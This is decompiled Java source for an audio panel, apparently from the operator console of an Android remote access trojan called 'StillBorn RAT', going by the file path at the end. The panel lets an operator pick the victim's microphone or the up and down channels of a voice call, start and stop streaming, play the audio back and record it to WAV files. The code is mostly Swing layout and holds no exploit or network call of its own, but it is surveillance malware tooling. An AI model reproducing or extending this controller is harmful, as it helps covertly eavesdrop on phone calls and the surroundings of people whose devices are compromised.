/*   1:    */ package gui.panel;
/*   2:    */ 
/*   3:    */ import gui.UserGUI;
/*   4:    */ import java.awt.Image;
/*   5:    */ import java.awt.Toolkit;
/*   6:    */ import java.awt.event.MouseAdapter;
/*   7:    */ import java.awt.event.MouseEvent;
/*   8:    */ import java.awt.event.MouseMotionAdapter;
/*   9:    */ import java.io.File;
/*  10:    */ import java.io.FileNotFoundException;
/*  11:    */ import java.io.FileOutputStream;
/*  12:    */ import java.io.IOException;
/*  13:    */ import java.text.SimpleDateFormat;
/*  14:    */ import java.util.Date;
/*  15:    */ import javax.sound.sampled.AudioFormat;
/*  16:    */ import javax.sound.sampled.AudioSystem;
/*  17:    */ import javax.sound.sampled.LineUnavailableException;
/*  18:    */ import javax.sound.sampled.SourceDataLine;
/*  19:    */ import javax.swing.GroupLayout;
/*  20:    */ import javax.swing.GroupLayout.Alignment;
/*  21:    */ import javax.swing.GroupLayout.ParallelGroup;
/*  22:    */ import javax.swing.GroupLayout.SequentialGroup;
/*  23:    */ import javax.swing.ImageIcon;
/*  24:    */ import javax.swing.JComboBox;
/*  25:    */ import javax.swing.JLabel;
/*  26:    */ import javax.swing.JPanel;
/*  27:    */ import javax.swing.LayoutStyle.ComponentPlacement;
/*  28:    */ import javax.swing.border.TitledBorder;
/*  29:    */ import utils.wavIO;
/*  30:    */ 
/*  31:    */ public class SoundPanel
/*  32:    */   extends JPanel
/*  33:    */ {
/*  34:    */   private UserGUI gui;
/*  35:    */   private SourceDataLine dataLine;
/*  36:    */   private boolean streaming;
/*  37:    */   private JLabel lblCaptureSource;
/*  38:    */   private JComboBox comboBox;
/*  39: 65 */   private boolean mute = false;
/*  40: 66 */   private boolean isRecording = false;
/*  41:    */   private JLabel lblMute;
/*  42:    */   private JLabel lblStop;
/*  43:    */   private JLabel lblStart;
/*  44:    */   private JLabel lblImage;
/*  45:    */   private JLabel lblSave;
/*  46:    */   private String nomRecord;
/*  47:    */   private FileOutputStream record;
/*  48:    */   
/*  49:    */   public SoundPanel(UserGUI gui)
/*  50:    */   {
/*  51: 82 */     this.streaming = false;
/*  52: 83 */     this.gui = gui;
/*  53:    */     
/*  54: 85 */     JPanel panel = new JPanel();
/*  55: 86 */     panel.setBorder(new TitledBorder(null, "Yayınlama ayarları", 4, 2, null, null));
/*  56:    */     
/*  57: 88 */     JPanel panel_1 = new JPanel();
/*  58: 89 */     panel_1.setBorder(new TitledBorder(null, "Bilgiler", 4, 2, null, null));
/*  59: 90 */     GroupLayout groupLayout = new GroupLayout(this);
/*  60: 91 */     groupLayout.setHorizontalGroup(
/*  61: 92 */       groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  62: 93 */       .addGroup(groupLayout.createSequentialGroup()
/*  63: 94 */       .addContainerGap()
/*  64: 95 */       .addGroup(groupLayout.createParallelGroup(GroupLayout.Alignment.TRAILING)
/*  65: 96 */       .addComponent(panel_1, GroupLayout.Alignment.LEADING, 0, 402, 32767)
/*  66: 97 */       .addComponent(panel, GroupLayout.Alignment.LEADING, -2, 400, 32767))
/*  67: 98 */       .addGap(8)));
/*  68:    */     
/*  69:100 */     groupLayout.setVerticalGroup(
/*  70:101 */       groupLayout.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  71:102 */       .addGroup(groupLayout.createSequentialGroup()
/*  72:103 */       .addContainerGap()
/*  73:104 */       .addComponent(panel, -2, 82, -2)
/*  74:105 */       .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
/*  75:106 */       .addComponent(panel_1, -2, 157, -2)
/*  76:107 */       .addContainerGap(26, 32767)));
/*  77:    */     
/*  78:    */ 
/*  79:110 */     JLabel lblSampleRate = new JLabel("sample oranı : ");
/*  80:    */     
/*  81:112 */     JLabel lblSampleSizeBits = new JLabel("sample biti :");
/*  82:    */     
/*  83:114 */     JLabel lblChannels = new JLabel("Kanallar :");
/*  84:    */     
/*  85:116 */     JLabel lblSigned = new JLabel("Kayıtlı :");
/*  86:    */     
/*  87:118 */     JLabel lblValrate = new JLabel("val_rate");
/*  88:    */     
/*  89:120 */     JLabel lblValsizebits = new JLabel("val_sizebits");
/*  90:    */     
/*  91:122 */     JLabel lblValchannels = new JLabel("val_channels");
/*  92:    */     
/*  93:124 */     JLabel lblValsigned = new JLabel("val_signed");
/*  94:    */     
/*  95:126 */     JPanel panel_image = new JPanel();
/*  96:127 */     GroupLayout gl_panel_1 = new GroupLayout(panel_1);
/*  97:128 */     gl_panel_1.setHorizontalGroup(
/*  98:129 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/*  99:130 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 100:131 */       .addContainerGap()
/* 101:132 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 102:133 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 103:134 */       .addComponent(lblChannels)
/* 104:135 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 105:136 */       .addComponent(lblValchannels))
/* 106:137 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 107:138 */       .addComponent(lblSampleRate)
/* 108:139 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 109:140 */       .addComponent(lblValrate))
/* 110:141 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 111:142 */       .addComponent(lblSampleSizeBits)
/* 112:143 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 113:144 */       .addComponent(lblValsizebits))
/* 114:145 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 115:146 */       .addComponent(lblSigned)
/* 116:147 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 117:148 */       .addComponent(lblValsigned)))
/* 118:149 */       .addGap(18)
/* 119:150 */       .addComponent(panel_image, -1, 245, 32767)
/* 120:151 */       .addContainerGap()));
/* 121:    */     
/* 122:153 */     gl_panel_1.setVerticalGroup(
/* 123:154 */       gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 124:155 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 125:156 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 126:157 */       .addGroup(gl_panel_1.createSequentialGroup()
/* 127:158 */       .addContainerGap()
/* 128:159 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 129:160 */       .addComponent(lblSampleRate)
/* 130:161 */       .addComponent(lblValrate))
/* 131:162 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 132:163 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 133:164 */       .addComponent(lblSampleSizeBits)
/* 134:165 */       .addComponent(lblValsizebits))
/* 135:166 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 136:167 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 137:168 */       .addComponent(lblChannels)
/* 138:169 */       .addComponent(lblValchannels))
/* 139:170 */       .addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED)
/* 140:171 */       .addGroup(gl_panel_1.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 141:172 */       .addComponent(lblSigned)
/* 142:173 */       .addComponent(lblValsigned)))
/* 143:174 */       .addComponent(panel_image, -2, 119, -2))
/* 144:175 */       .addContainerGap(-1, 32767)));
/* 145:    */     
/* 146:    */ 
/* 147:178 */     ImageIcon getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/note.bmp")));
/* 148:179 */     Image img = getImg.getImage();
/* 149:180 */     Image newimg = img.getScaledInstance(250, 111, 4);
/* 150:181 */     this.lblImage = new JLabel(new ImageIcon(newimg));
/* 151:182 */     this.lblImage.addMouseMotionListener(new MouseMotionAdapter()
/* 152:    */     {
/* 153:    */       public void mouseDragged(MouseEvent arg0)
/* 154:    */       {
/* 155:185 */         SoundPanel.this.changeLblImage();
/* 156:    */       }
/* 157:188 */     });
/* 158:189 */     panel_image.add(this.lblImage);
/* 159:190 */     panel_1.setLayout(gl_panel_1);
/* 160:191 */     setLayout(groupLayout);
/* 161:    */     
/* 162:193 */     this.lblCaptureSource = new JLabel("Kayıt kaynağı :");
/* 163:    */     
/* 164:195 */     Object[] items = { "Microphone", "Voice call (up & down)", "Up voice call", "Down voice call" };
/* 165:196 */     this.comboBox = new JComboBox(items);
/* 166:    */     
/* 167:198 */     getImg = reziseImage("/gui/res/gtk-media-play-ltr.png");
/* 168:199 */     this.lblStart = new JLabel(getImg);
/* 169:200 */     this.lblStart.addMouseListener(new MouseAdapter()
/* 170:    */     {
/* 171:    */       public void mouseClicked(MouseEvent arg0)
/* 172:    */       {
/* 173:203 */         SoundPanel.this.fireButtonStartStream();
/* 174:    */       }
/* 175:206 */     });
/* 176:207 */     getImg = reziseImage("/gui/res/gtk-media-stop.png");
/* 177:208 */     this.lblStop = new JLabel(getImg);
/* 178:209 */     this.lblStop.setEnabled(false);
/* 179:210 */     this.lblStop.addMouseListener(new MouseAdapter()
/* 180:    */     {
/* 181:    */       public void mouseClicked(MouseEvent e)
/* 182:    */       {
/* 183:213 */         SoundPanel.this.fireButtonStopStream();
/* 184:    */       }
/* 185:216 */     });
/* 186:217 */     getImg = reziseImage("/gui/res/sound.png");
/* 187:218 */     this.lblMute = new JLabel(getImg);
/* 188:219 */     this.lblMute.addMouseListener(new MouseAdapter()
/* 189:    */     {
/* 190:    */       public void mouseClicked(MouseEvent e)
/* 191:    */       {
/* 192:222 */         SoundPanel.this.fireButtonMute();
/* 193:    */       }
/* 194:225 */     });
/* 195:226 */     getImg = reziseImage("/gui/res/gtk-media-record.png");
/* 196:227 */     this.lblSave = new JLabel(getImg);
/* 197:228 */     this.lblSave.addMouseListener(new MouseAdapter()
/* 198:    */     {
/* 199:    */       public void mouseClicked(MouseEvent e)
/* 200:    */       {
/* 201:231 */         SoundPanel.this.fireButtonRecord();
/* 202:    */       }
/* 203:234 */     });
/* 204:235 */     GroupLayout gl_panel = new GroupLayout(panel);
/* 205:236 */     gl_panel.setHorizontalGroup(
/* 206:237 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 207:238 */       .addGroup(gl_panel.createSequentialGroup()
/* 208:239 */       .addContainerGap()
/* 209:240 */       .addComponent(this.lblCaptureSource)
/* 210:241 */       .addGap(18)
/* 211:242 */       .addComponent(this.comboBox, -2, -1, -2)
/* 212:243 */       .addGap(18)
/* 213:244 */       .addComponent(this.lblStart)
/* 214:245 */       .addGap(18)
/* 215:246 */       .addComponent(this.lblStop)
/* 216:247 */       .addGap(18)
/* 217:248 */       .addComponent(this.lblMute)
/* 218:249 */       .addGap(18)
/* 219:250 */       .addComponent(this.lblSave)
/* 220:251 */       .addContainerGap(-1, 32767)));
/* 221:    */     
/* 222:253 */     gl_panel.setVerticalGroup(
/* 223:254 */       gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 224:255 */       .addGroup(gl_panel.createSequentialGroup()
/* 225:256 */       .addContainerGap()
/* 226:257 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.TRAILING)
/* 227:258 */       .addComponent(this.lblSave)
/* 228:259 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.LEADING)
/* 229:260 */       .addComponent(this.lblMute)
/* 230:261 */       .addComponent(this.lblStop)
/* 231:262 */       .addGroup(gl_panel.createParallelGroup(GroupLayout.Alignment.BASELINE)
/* 232:263 */       .addComponent(this.lblCaptureSource)
/* 233:264 */       .addComponent(this.comboBox, -2, -1, -2)
/* 234:265 */       .addComponent(this.lblStart))))
/* 235:266 */       .addContainerGap(12, 32767)));
/* 236:    */     
/* 237:268 */     panel.setLayout(gl_panel);
/* 238:    */     
/* 239:270 */     AudioFormat format = new AudioFormat(11025.0F, 16, 1, true, false);
/* 240:    */     try
/* 241:    */     {
/* 242:272 */       this.dataLine = AudioSystem.getSourceDataLine(format);
/* 243:273 */       this.dataLine.open(format);
/* 244:    */     }
/* 245:    */     catch (LineUnavailableException e)
/* 246:    */     {
/* 247:275 */       e.printStackTrace();
/* 248:    */     }
/* 249:277 */     lblValchannels.setText("1");
/* 250:278 */     lblValrate.setText("11025");
/* 251:279 */     lblValsigned.setText("true");
/* 252:280 */     lblValsizebits.setText("16");
/* 253:    */   }
/* 254:    */   
/* 255:    */   private ImageIcon reziseImage(String path)
/* 256:    */   {
/* 257:285 */     ImageIcon getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource(path)));
/* 258:286 */     Image img = getImg.getImage();
/* 259:287 */     Image newimg = img.getScaledInstance(32, 32, 4);
/* 260:288 */     return new ImageIcon(newimg);
/* 261:    */   }
/* 262:    */   
/* 263:    */   private void fireButtonStartStream()
/* 264:    */   {
/* 265:292 */     this.streaming = true;
/* 266:293 */     int choice = 1;
/* 267:294 */     if (this.comboBox.getSelectedItem().equals("Voice call (up & down)")) {
/* 268:294 */       choice = 4;
/* 269:295 */     } else if (this.comboBox.getSelectedItem().equals("Up voice call")) {
/* 270:295 */       choice = 2;
/* 271:296 */     } else if (this.comboBox.getSelectedItem().equals("Down voice call")) {
/* 272:296 */       choice = 3;
/* 273:    */     }
/* 274:299 */     this.lblStart.setEnabled(false);
/* 275:300 */     this.lblStop.setEnabled(true);
/* 276:301 */     this.gui.fireStartSoundStreaming(choice);
/* 277:302 */     this.dataLine.start();
/* 278:    */   }
/* 279:    */   
/* 280:    */   private void fireButtonStopStream()
/* 281:    */   {
/* 282:306 */     this.streaming = false;
/* 283:307 */     this.lblStart.setEnabled(true);
/* 284:308 */     this.lblStop.setEnabled(false);
/* 285:309 */     this.gui.fireStopSoundStreaming();
/* 286:    */   }
/* 287:    */   
/* 288:    */   private void fireButtonMute()
/* 289:    */   {
/* 290:313 */     if (this.mute)
/* 291:    */     {
/* 292:315 */       this.mute = false;
/* 293:316 */       this.dataLine.flush();
/* 294:317 */       ImageIcon getImg = reziseImage("/gui/res/sound.png");
/* 295:318 */       this.lblMute.setIcon(getImg);
/* 296:319 */       this.lblMute.validate();
/* 297:    */     }
/* 298:    */     else
/* 299:    */     {
/* 300:323 */       this.mute = true;
/* 301:324 */       ImageIcon getImg = reziseImage("/gui/res/disable-sound.png");
/* 302:325 */       this.lblMute.setIcon(getImg);
/* 303:326 */       this.lblMute.validate();
/* 304:    */     }
/* 305:    */   }
/* 306:    */   
/* 307:    */   private void fireButtonRecord()
/* 308:    */   {
/* 309:332 */     if (this.isRecording)
/* 310:    */     {
/* 311:334 */       this.isRecording = false;
/* 312:335 */       ImageIcon getImg = reziseImage("/gui/res/gtk-media-record.png");
/* 313:336 */       this.lblSave.setIcon(getImg);
/* 314:337 */       this.lblSave.validate();
/* 315:    */       try
/* 316:    */       {
/* 317:341 */         wavIO wav = new wavIO(this.nomRecord + ".pcm");
/* 318:342 */         wav.readRaw();
/* 319:343 */         wav.setHeaders();
/* 320:344 */         wav.setPath(this.nomRecord + ".wav");
/* 321:345 */         wav.save();
/* 322:    */         
/* 323:347 */         File f = new File(this.nomRecord + ".pcm");
/* 324:348 */         f.delete();
/* 325:    */         
/* 326:350 */         this.record.close();
/* 327:351 */         this.record = null;
/* 328:352 */         this.nomRecord = null;
/* 329:    */       }
/* 330:    */       catch (IOException e)
/* 331:    */       {
/* 332:355 */         e.printStackTrace();
/* 333:    */       }
/* 334:    */     }
/* 335:    */     else
/* 336:    */     {
/* 337:360 */       this.isRecording = true;
/* 338:361 */       ImageIcon getImg = reziseImage("/gui/res/gtk-media-stop.png");
/* 339:362 */       this.lblSave.setIcon(getImg);
/* 340:363 */       this.lblSave.validate();
/* 341:    */       
/* 342:365 */       String format = "dd_MM_yy_H_mm_ss";
/* 343:366 */       SimpleDateFormat formater = new SimpleDateFormat(format);
/* 344:367 */       Date date = new Date();
/* 345:368 */       this.nomRecord = ("recordedSong_" + formater.format(date));
/* 346:    */       try
/* 347:    */       {
/* 348:372 */         this.record = new FileOutputStream(this.nomRecord + ".pcm");
/* 349:373 */         this.record.write("".getBytes());
/* 350:374 */         this.record = new FileOutputStream(this.nomRecord + ".pcm", true);
/* 351:375 */         addSoundBytes("ma".getBytes());
/* 352:    */       }
/* 353:    */       catch (FileNotFoundException e)
/* 354:    */       {
/* 355:378 */         e.printStackTrace();
/* 356:    */       }
/* 357:    */       catch (IOException e)
/* 358:    */       {
/* 359:382 */         e.printStackTrace();
/* 360:    */       }
/* 361:    */     }
/* 362:    */   }
/* 363:    */   
/* 364:    */   public void changeLblImage()
/* 365:    */   {
/* 366:389 */     ImageIcon getImg = new ImageIcon(Toolkit.getDefaultToolkit().getImage(UserGUI.class.getResource("/gui/res/Jesus.jpeg")));
/* 367:390 */     Image img = getImg.getImage();
/* 368:391 */     Image newimg = img.getScaledInstance(250, 111, 4);
/* 369:392 */     this.lblImage.setIcon(new ImageIcon(newimg));
/* 370:    */   }
/* 371:    */   
/* 372:    */   public void addSoundBytes(byte[] data)
/* 373:    */   {
/* 374:396 */     if (!this.mute) {
/* 375:397 */       this.dataLine.write(data, 0, data.length);
/* 376:    */     }
/* 377:398 */     if (this.isRecording) {
/* 378:    */       try
/* 379:    */       {
/* 380:402 */         this.record.write(data);
/* 381:    */       }
/* 382:    */       catch (IOException e)
/* 383:    */       {
/* 384:405 */         e.printStackTrace();
/* 385:    */       }
/* 386:    */     }
/* 387:    */   }
/* 388:    */   
/* 389:    */   public boolean getStreaming()
/* 390:    */   {
/* 391:413 */     return this.streaming;
/* 392:    */   }
/* 393:    */ }


/* Location:           C:\Users\SmileyFacedHacker\Downloads\StillBorn RAT (Android)\StillBorn RAT (Android)\StillBornRAT.jar
 * Qualified Name:     gui.panel.SoundPanel
 * JD-Core Version:    0.7.0.1
 */